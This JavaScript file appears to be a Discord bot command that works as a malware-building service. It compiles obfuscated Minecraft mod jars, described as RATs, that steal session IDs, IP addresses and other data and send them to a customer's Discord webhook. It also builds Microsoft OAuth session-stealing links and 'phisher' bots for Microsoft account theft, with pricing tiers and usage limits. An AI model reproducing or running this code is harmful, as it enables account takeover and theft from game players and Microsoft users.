import { SlashCommandBuilder, AttachmentBuilder } from "discord.js";
import { randomUUID } from "crypto";
import util from "node:util";
import { exec as exec1 } from "node:child_process";
import { readFile, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

import StatusBar from "../StatusBar.js";
import * as oAuthDB from "/root/oAuth/database.js";
import * as SHDB from "/root/SkyHelper/database.js";

const exec = util.promisify(exec1);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const { clientID, redirectURL } = JSON.parse(await readFile(new URL("/root/oAuth/config.json", import.meta.url)));

export const cooldown = {
  tier_0: 60 * 15,
  tier_1: 60 * 5,
  tier_2: 60 * 2,
  tier_3: 60 * 1,
};
export const tier = {
  free: [0, 1, 2, 3],
  basic: [1, 2, 3],
  premium: [1, 2, 3],
  oauth: [0, 1, 2, 3],
  phisher: [0, 1, 2, 3],
};
export const data = new SlashCommandBuilder()
  .setName("build")
  .setDescription("Builds a jar with the specified webhook.")
  .addSubcommand((subcommand) =>
    subcommand
      .setName("free")
      .setDescription("Build a RAT for just Minecraft SessionID stealing.")
      .addStringOption((option) =>
        option.setName("webhook").setDescription("The webhook to put in the jar").setRequired(true)
      )
      .addBooleanOption((option) =>
        option.setName("obfuscation").setDescription("Add obfuscation or not").setRequired(false)
      )
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("basic")
      .setDescription("Build a RAT for Minecraft SessionID stealing with IP and Networth.")
      .addStringOption((option) =>
        option.setName("webhook").setDescription("The webhook to put in the jar").setRequired(true)
      )
      .addBooleanOption((option) =>
        option.setName("obfuscation").setDescription("Add obfuscation or not").setRequired(false)
      )
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("premium")
      .setDescription("Build a RAT for stealing everything.")
      .addStringOption((option) =>
        option.setName("webhook").setDescription("The webhook to put in the jar").setRequired(true)
      )
      .addBooleanOption((option) =>
        option.setName("obfuscation").setDescription("Add obfuscation or not").setRequired(false)
      )
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("oauth")
      .setDescription("Build a oAuth link for Minecraft Session ID stealing.")
      .addStringOption((option) =>
        option.setName("webhook").setDescription("The webhook to use for oAuth").setRequired(true)
      )
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("phisher")
      .setDescription("Build a phisher bot for Microsoft Account stealing.")
      .addStringOption((option) => option.setName("token").setDescription("Your bot token").setRequired(true))
      .addStringOption((option) => option.setName("id").setDescription("Your bot ID").setRequired(true))
  )
  .setDMPermission(false);

export async function execute(client, interaction) {
  if (interaction.channel.id != client.config.building) {
    return client.sendErrorEmbed(interaction, `You can only build/use RAT commands in <#${client.config.building}>!`);
  }

  const ratType = interaction.options.getSubcommand();
  const ratTypeFormatted = ratType.charAt(0).toUpperCase() + ratType.slice(1);
  const webhook = interaction.options.getString("webhook");
  const webhookRegex = /^https:\/\/(?:\w+\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[A-Za-z0-9-_]+$/g;
  if (ratType != "phisher" && !webhookRegex.test(webhook)) {
    return client.sendErrorEmbed(interaction, "Please enter a valid webhook!");
  }

  const plan = await client.db.getPlan(interaction, interaction.user.id);
  const dhooked = plan == client.TIER_0;
  if (ratType == "free" || ratType == "basic" || ratType == "premium") {
    const statusBar = new StatusBar(ratType, interaction, "Compiling", "Obfuscating");
    const webhookExists = await client.db.getCode(interaction.user.id, webhook);
    const userWebhooks = await client.db.getWebhooks(interaction.user.id);
    if (userWebhooks.length >= client.config.limits.webhooks[plan] && !webhookExists) {
      return client.sendErrorEmbed(
        interaction,
        "You've exceeded the webhook limit. \nYou can view your webhooks using **/webhooks list** and delete them using **/webhooks delete**."
      );
    }
    if (client.isBuilding) {
      await client.sendErrorEmbed(interaction, "Another JAR is already being built!");
      return;
    }
    client.isBuilding = true;

    await statusBar.start();

    const code = webhookExists ?? randomUUID();
    await client.db.setWebhook(interaction.user.id, code, webhook, dhooked);
    const jar = await createJAR(client, statusBar, interaction, ratType, ratTypeFormatted, code);
    if (!jar) {
      client.isBuilding = false;
      await client.sendErrorEmbed(interaction, "Something went wrong. Please contact an administrator.");
      return;
    }
    await statusBar.finish(jar);

    client.isBuilding = false;
  } else if (ratType == "oauth") {
    const statusBar = new StatusBar(ratType + (dhooked ? "_free" : "_premium"), interaction, "Building");

    const webhookExists = await oAuthDB.getCode(interaction.user.id, webhook);
    const userWebhooks = await oAuthDB.getWebhooks(interaction.user.id);
    if (userWebhooks.length >= client.config.limits.oauth[plan] && !webhookExists) {
      return client.sendErrorEmbed(
        interaction,
        "You've exceeded the webhook limit. \nYou can view your webhooks using **/webhooks oauth list** and delete them using **/webhooks oauth delete**."
      );
    }

    await statusBar.start();

    const code = webhookExists ?? randomUUID();
    const link = await createOAuth(code, interaction.user.id, webhook, dhooked);
    await statusBar.finish(link);
  } else if (ratType == "phisher") {
    const statusBar = new StatusBar(ratType, interaction, "Building", "Starting Bot");
    await statusBar.start();

    const id = interaction.options.getString("id");
    const token = interaction.options.getString("token");

    const userBots = await SHDB.getBotsByUserID(interaction.user.id);
    if (userBots.length >= client.config.limits.phisher[plan]) {
      return client.sendErrorEmbed(
        interaction,
        "You've exceeded the phisher bot limit. \nYou can view your bots using **/bots list** and delete them using **/bots delete**."
      );
    }
    if (!isValidID(id)) {
      return client.sendErrorEmbed(interaction, "Please provide a valid bot ID!");
    }
    if (!isValidToken(id, token)) {
      return client.sendErrorEmbed(interaction, "Please provide a valid bot token!");
    }

    await statusBar.update();
    await SHDB.setBot(id, interaction.user.id, token, dhooked);
    await client.skyhelper.addBot(id, token, dhooked);

    await statusBar.finish({ id: id, token: token });
  }
}

async function createJAR(client, statusBar, interaction, ratType, ratTypeFormatted, uuid) {
  const obfuscation = client.config.devs.includes(interaction.user.id)
    ? interaction.options.getBoolean("obfuscation") == null || interaction.options.getBoolean("obfuscation")
    : true;
  return new Promise(async function (resolve, reject) {
    var javaFile;
    if (ratType == "free") {
      javaFile = path.join(__dirname, "/../tempFiles/FreeMod.java");
    } else if (ratType == "basic") {
      javaFile = path.join(__dirname, "/../tempFiles/BasicMod.java");
    } else if (ratType == "premium") {
      javaFile = path.join(__dirname, "/../tempFiles/PremiumMod.java");
    }

    const data = await readFile(javaFile, { encoding: "utf8" });
    await writeFile("/root/RAT/src/main/java/me/Aurora/ExampleMod.java", data.replace(/USER_ID_HERE/g, uuid), {
      encoding: "utf8",
    });

    const buildOutput = await exec("cd /root/RAT && ./gradlew build");
    if (buildOutput.stderr.includes("Note: Some input files use or override a deprecated API.")) {
      client.logError(buildOutput.stderr);
      return resolve(null);
    }

    await delay(2000);
    if (!obfuscation) {
      const attachment = new AttachmentBuilder("/root/RAT/build/libs/RAT-1.0.jar").setName(
        `${ratTypeFormatted}-RAT-1.0.jar`
      );

      return resolve(attachment);
    } else {
      const obfuscationOutput = await exec(
        "cd /root/RAT/build/libs && java -jar ./obfuscator.jar --jarIn ./RAT-1.0.jar --jarOut ./RAT-1.0-out.jar"
      );
      if (obfuscationOutput.stderr) {
        client.logError(obfuscationOutput.stderr);
        return resolve(null);
      }

      await delay(2000);
      const attachment = new AttachmentBuilder("/root/RAT/build/libs/RAT-1.0-out.jar").setName(
        `${ratTypeFormatted}-RAT-1.0.jar`
      );

      return resolve(attachment);
    }
  });
}

async function createOAuth(code, userID, webhook, dhooked) {
  return new Promise(async function (resolve, reject) {
    await oAuthDB.setWebhook(code, userID, webhook, dhooked);
    return resolve(
      `https://login.live.com/oauth20_authorize.srf?client_id=${clientID}&response_type=code&redirect_uri=${redirectURL}&scope=XboxLive.signin+offline_access&state=${code}`
    );
  });
}

function isValidID(id) {
  return !/\D/.test(id) && id.length >= 17 && id.length <= 19;
}

function isValidToken(id, token) {
  try {
    const base64ID = token.split(".")[0];
    const buff = Buffer.from(base64ID, "base64");
    const botID = buff.toString("ascii");

    return botID == id;
  } catch (e) {
    return false;
  }
}
